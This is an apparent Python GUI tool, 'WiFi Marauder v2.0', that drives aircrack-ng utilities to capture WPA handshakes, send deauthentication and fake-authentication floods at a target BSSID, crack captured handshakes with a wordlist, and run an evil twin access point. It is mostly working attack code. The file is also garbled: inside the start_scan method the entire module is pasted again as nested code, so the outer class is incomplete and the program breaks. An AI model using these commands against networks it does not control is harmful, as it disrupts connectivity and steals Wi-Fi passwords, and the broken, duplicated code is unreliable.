import sys
import os
import subprocess
import sqlite3
import json
import random
import csv
import time
from datetime import datetime
from math import cos, sin, pi, log10
from collections import Counter

from PySide6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QTabWidget, QVBoxLayout, QPushButton,
    QFileDialog, QLabel, QLineEdit, QTextEdit, QHBoxLayout, QMessageBox,
    QTableWidget, QTableWidgetItem, QHeaderView, QComboBox, QGroupBox, QDateEdit, QInputDialog,
    QGridLayout, QSplitter, QSpinBox, QCheckBox
)
from PySide6.QtCore import QDate, QTimer, Qt
from PySide6.QtGui import QIcon, QPixmap
from matplotlib.backends.backend_qt5agg import FigureCanvasQTAgg as FigureCanvas
from matplotlib.figure import Figure


class DatabaseManager:
    """
    Encapsulates SQLite database operations for the WiFi Marauder app.
    """

    def __init__(self, db_file="wifi_marauder.db"):
        self.conn = sqlite3.connect(db_file)
        self.create_tables()

    def create_tables(self):
        """
        Creates the necessary tables if they don't exist.
        """
        cursor = self.conn.cursor()

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY,
                timestamp TEXT,
                interface TEXT,
                duration INTEGER,
                output TEXT
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS captures (
                id INTEGER PRIMARY KEY,
                scan_id INTEGER,
                bssid TEXT,
                essid TEXT,
                handshake TEXT,
                FOREIGN KEY (scan_id) REFERENCES scans (id)
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS deauths (
                id INTEGER PRIMARY KEY,
                scan_id INTEGER,
                bssid TEXT,
                client TEXT,
                timestamp TEXT,
                FOREIGN KEY (scan_id) REFERENCES scans (id)
            )
        ''')

        self.conn.commit()

    def insert_scan(self, interface, duration, output):
        """
        Inserts a new scan record into the database.
        """
        cursor = self.conn.cursor()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        cursor.execute("INSERT INTO scans (timestamp, interface, duration, output) VALUES (?, ?, ?, ?)",
                       (timestamp, interface, duration, output))
        self.conn.commit()
        return cursor.lastrowid

    def insert_capture(self, scan_id, bssid, essid, handshake):
        """
        Inserts a new capture record into the database.
        """
        cursor = self.conn.cursor()
        cursor.execute("INSERT INTO captures (scan_id, bssid, essid, handshake) VALUES (?, ?, ?, ?)",
                       (scan_id, bssid, essid, handshake))
        self.conn.commit()

    def insert_deauth(self, scan_id, bssid, client):
        """
        Inserts a new deauthentication record into the database.
        """
        cursor = self.conn.cursor()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        cursor.execute("INSERT INTO deauths (scan_id, bssid, client, timestamp) VALUES (?, ?, ?, ?)",
                       (scan_id, bssid, client, timestamp))
        self.conn.commit()

    def get_scan_logs(self):
        """
        Retrieves all scan logs from the database.
        """
        cursor = self.conn.cursor()
        cursor.execute("SELECT * FROM scans ORDER BY timestamp DESC")
        return cursor.fetchall()

    def get_captures_for_scan(self, scan_id):
        """
        Retrieves all captures for a given scan ID.
        """
        cursor = self.conn.cursor()
        cursor.execute("SELECT * FROM captures WHERE scan_id = ?", (scan_id,))
        return cursor.fetchall()

    def get_deauths_for_scan(self, scan_id):
        """
        Retrieves all deauthentications for a given scan ID.
        """
        cursor = self.conn.cursor()
        cursor.execute("SELECT * FROM deauths WHERE scan_id = ? ORDER BY timestamp", (scan_id,))
        return cursor.fetchall()

    def close(self):
        """
        Closes the database connection.
        """
        self.conn.close()


class WiFiMarauderGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("WiFi Marauder v2.0")
        self.setGeometry(100, 100, 1200, 800)

        # Load application icon
        icon = QIcon("wifi_marauder.png")
        self.setWindowIcon(icon)

        # Initialize database and load vendor mapping
        self.db = DatabaseManager()
        self.vendor_mapping = self.load_vendors()

        # Create central widget and main layout
        central_widget = QWidget(self)
        self.setCentralWidget(central_widget)
        main_layout = QHBoxLayout(central_widget)

        # Create left pane with options
        left_pane = QWidget()
        left_layout = QVBoxLayout(left_pane)

        # Interface selection
        self.interface_box = QGroupBox("Interface")
        interface_layout = QVBoxLayout(self.interface_box)
        self.interface_selector = QComboBox()
        self.interface_selector.addItems(self.detect_interfaces())
        interface_layout.addWidget(self.interface_selector)
        left_layout.addWidget(self.interface_box)

        # Monitor mode controls
        self.monitor_box = QGroupBox("Monitor Mode")
        monitor_layout = QVBoxLayout(self.monitor_box)
        self.monitor_btn = QPushButton("Enable Monitor Mode")
        self.monitor_btn.clicked.connect(self.toggle_monitor_mode)
        monitor_layout.addWidget(self.monitor_btn)
        left_layout.addWidget(self.monitor_box)

        # Scan controls
        self.scan_box = QGroupBox("Network Scan")
        scan_layout = QVBoxLayout(self.scan_box)
        self.scan_duration = QSpinBox()
        self.scan_duration.setMinimum(5)
        self.scan_duration.setMaximum(300)
        self.scan_duration.setValue(30)
        self.scan_duration.setSuffix(" seconds")
        scan_layout.addWidget(QLabel("Scan Duration:"))
        scan_layout.addWidget(self.scan_duration)
        self.scan_btn = QPushButton("Start Scan")
        self.scan_btn.clicked.connect(self.start_scan)
        scan_layout.addWidget(self.scan_btn)
        left_layout.addWidget(self.scan_box)

        # Capture controls
        self.capture_box = QGroupBox("Handshake Capture")
        capture_layout = QVBoxLayout(self.capture_box)
        self.capture_essid = QLineEdit()
        self.capture_essid.setPlaceholderText("Target ESSID")
        capture_layout.addWidget(self.capture_essid)
        self.capture_bssid = QLineEdit()
        self.capture_bssid.setPlaceholderText("Target BSSID")
        capture_layout.addWidget(self.capture_bssid)
        self.capture_btn = QPushButton("Start Capture")
        self.capture_btn.clicked.connect(self.start_handshake_capture)
        capture_layout.addWidget(self.capture_btn)
        left_layout.addWidget(self.capture_box)

        # Deauth attack controls
        self.deauth_box = QGroupBox("Deauth Attack")
        deauth_layout = QVBoxLayout(self.deauth_box)
        self.deauth_bssid = QLineEdit()
        self.deauth_bssid.setPlaceholderText("Target BSSID")
        deauth_layout.addWidget(self.deauth_bssid)
        self.deauth_client = QLineEdit()
        self.deauth_client.setPlaceholderText("Target Client MAC")
        deauth_layout.addWidget(self.deauth_client)
        self.deauth_count = QSpinBox()
        self.deauth_count.setMinimum(1)
        self.deauth_count.setMaximum(100)
        self.deauth_count.setValue(5)
        deauth_layout.addWidget(QLabel("Deauth Packets:"))
        deauth_layout.addWidget(self.deauth_count)
        self.deauth_btn = QPushButton("Start Deauth")
        self.deauth_btn.clicked.connect(self.start_deauth_attack)
        deauth_layout.addWidget(self.deauth_btn)
        left_layout.addWidget(self.deauth_box)

        # Cracking controls
        self.crack_box = QGroupBox("Cracking")
        crack_layout = QVBoxLayout(self.crack_box)
        self.crack_handshake = QLineEdit()
        self.crack_handshake.setPlaceholderText("Handshake File")
        crack_layout.addWidget(self.crack_handshake)
        self.crack_wordlist = QLineEdit()
        self.crack_wordlist.setPlaceholderText("Wordlist File")
        crack_layout.addWidget(self.crack_wordlist)
        self.crack_btn = QPushButton("Start Cracking")
        self.crack_btn.clicked.connect(self.start_cracking)
        crack_layout.addWidget(self.crack_btn)
        left_layout.addWidget(self.crack_box)

        # EvilAP controls
        self.evilap_box = QGroupBox("Evil AP")
        evilap_layout = QVBoxLayout(self.evilap_box)
        self.evilap_essid = QLineEdit()
        self.evilap_essid.setPlaceholderText("Evil AP ESSID")
        evilap_layout.addWidget(self.evilap_essid)
        self.evilap_password = QLineEdit()
        self.evilap_password.setPlaceholderText("Evil AP Password")
        evilap_layout.addWidget(self.evilap_password)
        self.evilap_btn = QPushButton("Start Evil AP")
        self.evilap_btn.clicked.connect(self.start_evil_ap)
        evilap_layout.addWidget(self.evilap_btn)
        left_layout.addWidget(self.evilap_box)

        # FakeAuth attack controls
        self.fakeauth_box = QGroupBox("FakeAuth Attack")
        fakeauth_layout = QVBoxLayout(self.fakeauth_box)
        self.fakeauth_bssid = QLineEdit()
        self.fakeauth_bssid.setPlaceholderText("Target BSSID")
        fakeauth_layout.addWidget(self.fakeauth_bssid)
        self.fakeauth_btn = QPushButton("Start FakeAuth")
        self.fakeauth_btn.clicked.connect(self.start_fakeauth_attack)
        fakeauth_layout.addWidget(self.fakeauth_btn)
        left_layout.addWidget(self.fakeauth_box)

        # Add left pane to main layout
        main_layout.addWidget(left_pane)

        # Create right pane with tabs
        right_pane = QTabWidget()
        right_pane.setTabPosition(QTabWidget.North)
        right_pane.setDocumentMode(True)

        # Scan output tab
        self.scan_tab = QWidget()
        scan_tab_layout = QVBoxLayout(self.scan_tab)
        self.scan_output = QTextEdit()
        self.scan_output.setReadOnly(True)
        scan_tab_layout.addWidget(self.scan_output)
        right_pane.addTab(self.scan_tab, "Scan Output")

        # Scan logs tab
        self.scanlog_tab = QWidget()
        scanlog_layout = QVBoxLayout(self.scanlog_tab)
        self.scanlog_table = QTableWidget()
        self.scanlog_table.setColumnCount(5)
        self.scanlog_table.setHorizontalHeaderLabels(["ID", "Timestamp", "Interface", "Duration", "Output"])
        self.scanlog_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        scanlog_layout.addWidget(self.scanlog_table)
        self.load_scan_logs()
        right_pane.addTab(self.scanlog_tab, "Scan Logs")

        # Analytics tab
        self.analytics_tab = QWidget()
        analytics_layout = QVBoxLayout(self.analytics_tab)

        # AP Vendor Chart
        self.ap_vendor_chart = FigureCanvas(Figure(figsize=(5, 3)))
        analytics_layout.addWidget(self.ap_vendor_chart)

        # Handshake Capture Chart
        self.handshake_chart = FigureCanvas(Figure(figsize=(5, 3)))
        analytics_layout.addWidget(self.handshake_chart)

        # Attack Distribution Chart
        self.attack_chart = FigureCanvas(Figure(figsize=(5, 3)))
        analytics_layout.addWidget(self.attack_chart)

        right_pane.addTab(self.analytics_tab, "Analytics")

        # Add right pane to main layout
        main_layout.addWidget(right_pane)

    def detect_interfaces(self):
        """
        Detects available wireless interfaces.
        """
        try:
            output = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode()
            return [line.split()[0] for line in output.splitlines() if "IEEE 802.11" in line]
        except:
            return ["wlan0"]

    def toggle_monitor_mode(self):
        """
        Toggles monitor mode on the selected interface.
        """
        iface = self.interface_selector.currentText()
        try:
            output = subprocess.check_output(["airmon-ng", "start", iface], stderr=subprocess.DEVNULL).decode()
            self.append_output(f"Enabled monitor mode on {iface}")
            QMessageBox.information(self, "Monitor Mode", f"Enabled monitor mode on {iface}")
        except subprocess.CalledProcessError as e:
            self.append_output(f"Monitor mode failed: {str(e)}")
            QMessageBox.warning(self, "Monitor Mode Failed", str(e))

    def start_scan(self):
        """
        Starts a network scan using airodump-ng.
        """
        iface = self.interface_selector.currentText()
        duration = self.scan_duration.value()

        import sys
        import os
        import subprocess
        import sqlite3
        import json
        import random
        import csv
        import time
        from datetime import datetime
        from math import cos, sin, pi, log10
        from collections import Counter

        from PySide6.QtWidgets import (
            QApplication, QMainWindow, QWidget, QTabWidget, QVBoxLayout, QPushButton,
            QFileDialog, QLabel, QLineEdit, QTextEdit, QHBoxLayout, QMessageBox,
            QTableWidget, QTableWidgetItem, QHeaderView, QComboBox, QGroupBox, QDateEdit, QInputDialog,
            QGridLayout, QSplitter, QSpinBox, QCheckBox
        )
        from PySide6.QtCore import QDate, QTimer, Qt
        from PySide6.QtGui import QIcon, QPixmap
        from matplotlib.backends.backend_qt5agg import FigureCanvasQTAgg as FigureCanvas
        from matplotlib.figure import Figure

        class DatabaseManager:
            """
            Encapsulates SQLite database operations for the WiFi Marauder app.
            """

            def __init__(self, db_file="wifi_marauder.db"):
                self.conn = sqlite3.connect(db_file)
                self.create_tables()

            def create_tables(self):
                """
                Creates the necessary tables if they don't exist.
                """
                cursor = self.conn.cursor()

                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS scans (
                        id INTEGER PRIMARY KEY,
                        timestamp TEXT,
                        interface TEXT,
                        duration INTEGER,
                        output TEXT
                    )
                ''')

                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS captures (
                        id INTEGER PRIMARY KEY,
                        scan_id INTEGER,
                        bssid TEXT,
                        essid TEXT,
                        handshake TEXT,
                        FOREIGN KEY (scan_id) REFERENCES scans (id)
                    )
                ''')

                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS deauths (
                        id INTEGER PRIMARY KEY,
                        scan_id INTEGER,
                        bssid TEXT,
                        client TEXT,
                        timestamp TEXT,
                        FOREIGN KEY (scan_id) REFERENCES scans (id)
                    )
                ''')

                self.conn.commit()

            def insert_scan(self, interface, duration, output):
                """
                Inserts a new scan record into the database.
                """
                cursor = self.conn.cursor()
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                cursor.execute("INSERT INTO scans (timestamp, interface, duration, output) VALUES (?, ?, ?, ?)",
                               (timestamp, interface, duration, output))
                self.conn.commit()
                return cursor.lastrowid

            def insert_capture(self, scan_id, bssid, essid, handshake):
                """
                Inserts a new capture record into the database.
                """
                cursor = self.conn.cursor()
                cursor.execute("INSERT INTO captures (scan_id, bssid, essid, handshake) VALUES (?, ?, ?, ?)",
                               (scan_id, bssid, essid, handshake))
                self.conn.commit()

            def insert_deauth(self, scan_id, bssid, client):
                """
                Inserts a new deauthentication record into the database.
                """
                cursor = self.conn.cursor()
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                cursor.execute("INSERT INTO deauths (scan_id, bssid, client, timestamp) VALUES (?, ?, ?, ?)",
                               (scan_id, bssid, client, timestamp))
                self.conn.commit()

            def get_scan_logs(self):
                """
                Retrieves all scan logs from the database.
                """
                cursor = self.conn.cursor()
                cursor.execute("SELECT * FROM scans ORDER BY timestamp DESC")
                return cursor.fetchall()

            def get_captures_for_scan(self, scan_id):
                """
                Retrieves all captures for a given scan ID.
                """
                cursor = self.conn.cursor()
                cursor.execute("SELECT * FROM captures WHERE scan_id = ?", (scan_id,))
                return cursor.fetchall()

            def get_deauths_for_scan(self, scan_id):
                """
                Retrieves all deauthentications for a given scan ID.
                """
                cursor = self.conn.cursor()
                cursor.execute("SELECT * FROM deauths WHERE scan_id = ? ORDER BY timestamp", (scan_id,))
                return cursor.fetchall()

            def close(self):
                """
                Closes the database connection.
                """
                self.conn.close()

        class WiFiMarauderGUI(QMainWindow):
            def __init__(self):
                super().__init__()
                self.setWindowTitle("WiFi Marauder v2.0")
                self.setGeometry(100, 100, 1200, 800)

                # Load application icon
                icon = QIcon("wifi_marauder.png")
                self.setWindowIcon(icon)

                # Initialize database and load vendor mapping
                self.db = DatabaseManager()
                self.vendor_mapping = self.load_vendors()

                # Create central widget and main layout
                central_widget = QWidget(self)
                self.setCentralWidget(central_widget)
                main_layout = QHBoxLayout(central_widget)

                # Create left pane with options
                left_pane = QWidget()
                left_layout = QVBoxLayout(left_pane)

                # Interface selection
                self.interface_box = QGroupBox("Interface")
                interface_layout = QVBoxLayout(self.interface_box)
                self.interface_selector = QComboBox()
                self.interface_selector.addItems(self.detect_interfaces())
                interface_layout.addWidget(self.interface_selector)
                left_layout.addWidget(self.interface_box)

                # Monitor mode controls
                self.monitor_box = QGroupBox("Monitor Mode")
                monitor_layout = QVBoxLayout(self.monitor_box)
                self.monitor_btn = QPushButton("Enable Monitor Mode")
                self.monitor_btn.clicked.connect(self.toggle_monitor_mode)
                monitor_layout.addWidget(self.monitor_btn)
                left_layout.addWidget(self.monitor_box)

                # Scan controls
                self.scan_box = QGroupBox("Network Scan")
                scan_layout = QVBoxLayout(self.scan_box)
                self.scan_duration = QSpinBox()
                self.scan_duration.setMinimum(5)
                self.scan_duration.setMaximum(300)
                self.scan_duration.setValue(30)
                self.scan_duration.setSuffix(" seconds")
                scan_layout.addWidget(QLabel("Scan Duration:"))
                scan_layout.addWidget(self.scan_duration)
                self.scan_btn = QPushButton("Start Scan")
                self.scan_btn.clicked.connect(self.start_scan)
                scan_layout.addWidget(self.scan_btn)
                left_layout.addWidget(self.scan_box)

                # Capture controls
                self.capture_box = QGroupBox("Handshake Capture")
                capture_layout = QVBoxLayout(self.capture_box)
                self.capture_essid = QLineEdit()
                self.capture_essid.setPlaceholderText("Target ESSID")
                capture_layout.addWidget(self.capture_essid)
                self.capture_bssid = QLineEdit()
                self.capture_bssid.setPlaceholderText("Target BSSID")
                capture_layout.addWidget(self.capture_bssid)
                self.capture_btn = QPushButton("Start Capture")
                self.capture_btn.clicked.connect(self.start_handshake_capture)
                capture_layout.addWidget(self.capture_btn)
                left_layout.addWidget(self.capture_box)

                # Deauth attack controls
                self.deauth_box = QGroupBox("Deauth Attack")
                deauth_layout = QVBoxLayout(self.deauth_box)
                self.deauth_bssid = QLineEdit()
                self.deauth_bssid.setPlaceholderText("Target BSSID")
                deauth_layout.addWidget(self.deauth_bssid)
                self.deauth_client = QLineEdit()
                self.deauth_client.setPlaceholderText("Target Client MAC")
                deauth_layout.addWidget(self.deauth_client)
                self.deauth_count = QSpinBox()
                self.deauth_count.setMinimum(1)
                self.deauth_count.setMaximum(100)
                self.deauth_count.setValue(5)
                deauth_layout.addWidget(QLabel("Deauth Packets:"))
                deauth_layout.addWidget(self.deauth_count)
                self.deauth_btn = QPushButton("Start Deauth")
                self.deauth_btn.clicked.connect(self.start_deauth_attack)
                deauth_layout.addWidget(self.deauth_btn)
                left_layout.addWidget(self.deauth_box)

                # Cracking controls
                self.crack_box = QGroupBox("Cracking")
                crack_layout = QVBoxLayout(self.crack_box)
                self.crack_handshake = QLineEdit()
                self.crack_handshake.setPlaceholderText("Handshake File")
                crack_layout.addWidget(self.crack_handshake)
                self.crack_wordlist = QLineEdit()
                self.crack_wordlist.setPlaceholderText("Wordlist File")
                crack_layout.addWidget(self.crack_wordlist)
                self.crack_btn = QPushButton("Start Cracking")
                self.crack_btn.clicked.connect(self.start_cracking)
                crack_layout.addWidget(self.crack_btn)
                left_layout.addWidget(self.crack_box)

                # EvilAP controls
                self.evilap_box = QGroupBox("Evil AP")
                evilap_layout = QVBoxLayout(self.evilap_box)
                self.evilap_essid = QLineEdit()
                self.evilap_essid.setPlaceholderText("Evil AP ESSID")
                evilap_layout.addWidget(self.evilap_essid)
                self.evilap_password = QLineEdit()
                self.evilap_password.setPlaceholderText("Evil AP Password")
                evilap_layout.addWidget(self.evilap_password)
                self.evilap_btn = QPushButton("Start Evil AP")
                self.evilap_btn.clicked.connect(self.start_evil_ap)
                evilap_layout.addWidget(self.evilap_btn)
                left_layout.addWidget(self.evilap_box)

                # FakeAuth attack controls
                self.fakeauth_box = QGroupBox("FakeAuth Attack")
                fakeauth_layout = QVBoxLayout(self.fakeauth_box)
                self.fakeauth_bssid = QLineEdit()
                self.fakeauth_bssid.setPlaceholderText("Target BSSID")
                fakeauth_layout.addWidget(self.fakeauth_bssid)
                self.fakeauth_btn = QPushButton("Start FakeAuth")
                self.fakeauth_btn.clicked.connect(self.start_fakeauth_attack)
                fakeauth_layout.addWidget(self.fakeauth_btn)
                left_layout.addWidget(self.fakeauth_box)

                # Add left pane to main layout
                main_layout.addWidget(left_pane)

                # Create right pane with tabs
                right_pane = QTabWidget()
                right_pane.setTabPosition(QTabWidget.North)
                right_pane.setDocumentMode(True)

                # Scan output tab
                self.scan_tab = QWidget()
                scan_tab_layout = QVBoxLayout(self.scan_tab)
                self.scan_output = QTextEdit()
                self.scan_output.setReadOnly(True)
                scan_tab_layout.addWidget(self.scan_output)
                right_pane.addTab(self.scan_tab, "Scan Output")

                # Scan logs tab
                self.scanlog_tab = QWidget()
                scanlog_layout = QVBoxLayout(self.scanlog_tab)
                self.scanlog_table = QTableWidget()
                self.scanlog_table.setColumnCount(5)
                self.scanlog_table.setHorizontalHeaderLabels(["ID", "Timestamp", "Interface", "Duration", "Output"])
                self.scanlog_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
                scanlog_layout.addWidget(self.scanlog_table)
                self.load_scan_logs()
                right_pane.addTab(self.scanlog_tab, "Scan Logs")

                # Analytics tab
                self.analytics_tab = QWidget()
                analytics_layout = QVBoxLayout(self.analytics_tab)

                # AP Vendor Chart
                self.ap_vendor_chart = FigureCanvas(Figure(figsize=(5, 3)))
                analytics_layout.addWidget(self.ap_vendor_chart)

                # Handshake Capture Chart
                self.handshake_chart = FigureCanvas(Figure(figsize=(5, 3)))
                analytics_layout.addWidget(self.handshake_chart)

                # Attack Distribution Chart
                self.attack_chart = FigureCanvas(Figure(figsize=(5, 3)))
                analytics_layout.addWidget(self.attack_chart)

                right_pane.addTab(self.analytics_tab, "Analytics")

                # Add right pane to main layout
                main_layout.addWidget(right_pane)

            def detect_interfaces(self):
                """
                Detects available wireless interfaces.
                """
                try:
                    output = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode()
                    return [line.split()[0] for line in output.splitlines() if "IEEE 802.11" in line]
                except:
                    return ["wlan0"]

            def toggle_monitor_mode(self):
                """
                Toggles monitor mode on the selected interface.
                """
                iface = self.interface_selector.currentText()
                try:
                    output = subprocess.check_output(["airmon-ng", "start", iface], stderr=subprocess.DEVNULL).decode()
                    self.append_output(f"Enabled monitor mode on {iface}")
                    QMessageBox.information(self, "Monitor Mode", f"Enabled monitor mode on {iface}")
                except subprocess.CalledProcessError as e:
                    self.append_output(f"Monitor mode failed: {str(e)}")
                    QMessageBox.warning(self, "Monitor Mode Failed", str(e))

            def start_scan(self):
                """
                Starts a network scan using airodump-ng.
                """
                iface = self.interface_selector.currentText()
                duration = self.scan_duration.value()

                try:
                    self.scan_output.clear()
                    self.append_output(f" Starting scan on interface {iface} for {duration} seconds "
                                       f"Saving scan output to scan_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv")

                    scan_file = f"scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
                    cmd = ["airodump-ng", "-w", scan_file, "--output-format", "csv", iface]
                    scan_proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)

                    start_time = time.time()
                    while time.time() - start_time <= duration:
                        output = scan_proc.stdout.readline()
                        if output == '' and scan_proc.poll() is not None:
                            break
                        if output:
                            self.append_output(output.strip())

                    scan_proc.terminate()
                    self.append_output(f"Scan completed. Results saved to {scan_file}")

                    with open(scan_file, "r") as f:
                        output = f.read()

                    scan_id = self.db.insert_scan(iface, duration, output)
                    self.load_scan_logs()
                    self.plot_ap_vendors(scan_file)

                except Exception as e:
                    self.append_output(f"Scan failed: {str(e)}")
                    QMessageBox.warning(self, "Scan Failed", str(e))

            def start_handshake_capture(self):
                """
                Starts a handshake capture using airodump-ng.
                """
                bssid = self.capture_bssid.text()
                essid = self.capture_essid.text()

                print("[+] ")

                if not bssid or not essid:
                    QMessageBox.warning(self, "Missing Input", "Please provide target BSSID and ESSID.")
                    return

                self.append_output(f"Starting handshake capture for {essid} ({bssid})")

                capture_file = f"capture_{essid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
                cmd = ["airodump-ng", "-w", capture_file, "--bssid", bssid, "--essid", essid, "--output-format", "pcap",
                       (self.interface_selector.currentText())]
                capture_proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)

                while True:
                    output = capture_proc.stdout.readline()
                    if "WPA handshake:" in output:
                        self.append_output("WPA handshake captured!")
                        time.sleep(5)  # Wait a bit more to capture extra packets
                        break
                    if output == '' and capture_proc.poll() is not None:
                        break
                    if output:
                        self.append_output(output.strip())

                capture_proc.terminate()
                self.append_output(f"Handshake capture completed. Saved to {capture_file}-01.cap")

                self.db.insert_capture(self.db.get_scan_logs()[0][0], bssid, essid, f"{capture_file}-01.cap")
                self.plot_handshake_captures()

            def start_deauth_attack(self):
                """
                Starts a deauthentication attack using aireplay-ng.
                """
                iface = self.interface_selector.currentText()
                bssid = self.deauth_bssid.text()
                client = self.deauth_client.text()
                count = self.deauth_count.value()

                if not bssid:
                    QMessageBox.warning(self, "Missing Input", "Please provide target BSSID.")
                    return

                self.append_output(f"Starting deauthentication attack against {bssid}")

                cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
                if client:
                    cmd.extend(["-c", client])
                cmd.append(iface)

                deauth_proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)

                for _ in range(count):
                    output = deauth_proc.stdout.readline()
                    if output == '' and deauth_proc.poll() is not None:
                        break
                    if output:
                        self.append_output(output.strip())

                deauth_proc.wait()

                self.append_output(f"Deauthentication attack completed. Sent {count} packets.")

                # Get the latest scan ID
                latest_scan = self.db.get_scan_logs()
                if latest_scan:
                    scan_id = latest_scan[0][0]
                    self.db.insert_deauth(scan_id, bssid, client)
                    self.plot_attack_distribution()
                else:
                    self.append_output("No scan logs found. Skipping deauth log and attack distribution plot.")

            def start_cracking(self):
                """
                Starts password cracking using aircrack-ng.
                """
                handshake_file = self.crack_handshake.text()
                wordlist_file = self.crack_wordlist.text()

                if not handshake_file or not wordlist_file:
                    QMessageBox.warning(self, "Missing Input", "Please provide handshake file and wordlist.")
                    return

                self.append_output(f"Starting password cracking on {handshake_file} with {wordlist_file}")

                cmd = ["aircrack-ng", "-w", wordlist_file, handshake_file]
                crack_proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)

                while True:
                    output = crack_proc.stdout.readline()
                    if "KEY FOUND!" in output:
                        password = output.split("KEY FOUND! [ ")[1].split(" ]")[0]
                        self.append_output(f"Password found: {password}")
                        QMessageBox.information(self, "Password Found", f"The password is: {password}")
                        break
                    if output == '' and crack_proc.poll() is not None:
                        self.append_output("Password not found in the provided wordlist.")
                        break
                    if output:
                        self.append_output(output.strip())

                crack_proc.wait()

            def start_evil_ap(self):
                """
                Starts an Evil Twin AP using airbase-ng.
                """
                iface = self.interface_selector.currentText()
                essid = self.evilap_essid.text()
                password = self.evilap_password.text()

                if not essid or not password:
                    QMessageBox.warning(self, "Missing Input", "Please provide Evil AP ESSID and password.")
                    return

                self.append_output(f"Starting Evil Twin AP with ESSID: {essid}")

                cmd = ["airbase-ng", "-e", essid, "-P", "-Z", "4", "-F", "wpa2_psk", iface]
                evilap_proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)

                while True:
                    output = evilap_proc.stdout.readline()
                    if output == '' and evilap_proc.poll() is not None:
                        break
                    if output:
                        self.append_output(output.strip())

            def start_fakeauth_attack(self):
                """
                Starts a FakeAuth attack using aireplay-ng.
                """
                iface = self.interface_selector.currentText()
                bssid = self.fakeauth_bssid.text()

                if not bssid:
                    QMessageBox.warning(self, "Missing Input", "Please provide target BSSID.")
                    return

                self.append_output(f"Starting FakeAuth attack against {bssid}")

                cmd = ["aireplay-ng", "--fakeauth", "30", "-a", bssid, iface]
                fakeauth_proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)

                while True:
                    output = fakeauth_proc.stdout.readline()
                    if output == '' and fakeauth_proc.poll() is not None:
                        break
                    if output:
                        self.append_output(output.strip())

                fakeauth_proc.wait()

                self.append_output("FakeAuth attack completed.")
                self.db.insert_deauth(self.db.get_scan_logs()[0][0], bssid, None)  # Log as deauth for simplicity
                self.plot_attack_distribution()

            def load_scan_logs(self):
                """
                Loads scan logs from the database into the scan log table.
                """
                logs = self.db.get_scan_logs()
                self.scanlog_table.setRowCount(len(logs))

                for i, log in enumerate(logs):
                    for j in range(5):
                        self.scanlog_table.setItem(i, j, QTableWidgetItem(str(log[j])))

            def plot_ap_vendors(self, scan_file):
                """
                Plots the distribution of AP vendors based on the scan results.
                """
                vendors = []
                with open(scan_file, "r") as f:
                    reader = csv.reader(f)
                    next(reader)  # Skip header
                    for row in reader:
                        if len(row) >= 2:
                            mac = row[0].strip()
                            if mac:
                                vendor = self.lookup_vendor(mac)
                                vendors.append(vendor)

                vendor_counts = Counter(vendors)

                ax = self.ap_vendor_chart.figure.clear()
                ax = self.ap_vendor_chart.figure.add_subplot(111)
                ax.pie([count for _, count in vendor_counts.most_common(5)], labels=[vendor for vendor, _ in vendor_counts.most_common(5)], autopct="%1.1f%%")
                ax.set_title("Top 5 AP Vendors")
                self.ap_vendor_chart.draw()

            def plot_handshake_captures(self):
                """
                Plots the number of handshake captures over time.
                """
                captures = self.db.get_captures_for_scan(self.db.get_scan_logs()[0][0])
                capture_times = [datetime.strptime(cap[3].split(".")[0], "%Y%m%d_%H%M%S") for cap in captures]

                ax = self.handshake_chart.figure.clear()
                ax = self.handshake_chart.figure.add_subplot(111)
                ax.plot(capture_times, range(1, len(capture_times) + 1))
                ax.set_xlabel("Time")
                ax.set_ylabel("Handshake Captures")
                ax.set_title("Handshake Captures over Time")
                self.handshake_chart.draw()

            def plot_attack_distribution(self):
                """
                Plots the distribution of attacks (deauths and fakeauths).
                """
                attacks = self.db.get_deauths_for_scan(self.db.get_scan_logs()[0][0])
                attack_types = ["Deauth" if attack[3] else "FakeAuth" for attack in attacks]

                attack_counts = Counter(attack_types)

                ax = self.attack_chart.figure.clear()
                ax = self.attack_chart.figure.add_subplot(111)
                ax.bar(attack_counts.keys(), attack_counts.values())
                ax.set_xlabel("Attack Type")
                ax.set_ylabel("Count")
                ax.set_title("Deauth and FakeAuth Attacks")
                self.attack_chart.draw()

            def lookup_vendor(self, mac):
                """
                Looks up the vendor of a given MAC address.
                """
                try:
                    oui = mac[:8].upper()
                    return self.vendor_mapping.get(oui, "Unknown")
                except:
                    return "Unknown"

            def load_vendors(self):
                """
                Loads the MAC-to-vendor mapping from a JSON file.
                """
                try:
                    with open("vendors.json", "r") as f:
                        return json.load(f)
                except:
                    return {}

            def append_output(self, text):
                """
                Appends text to the scan output text area.
                """
                self.scan_output.insertPlainText(text + "\n")
                self.scan_output.ensureCursorVisible()

            if __name__ == "__main__":
                app = QApplication(sys.argv)
                window = WiFiMarauderGUI()
                window.show()
                sys.exit(app.exec())
                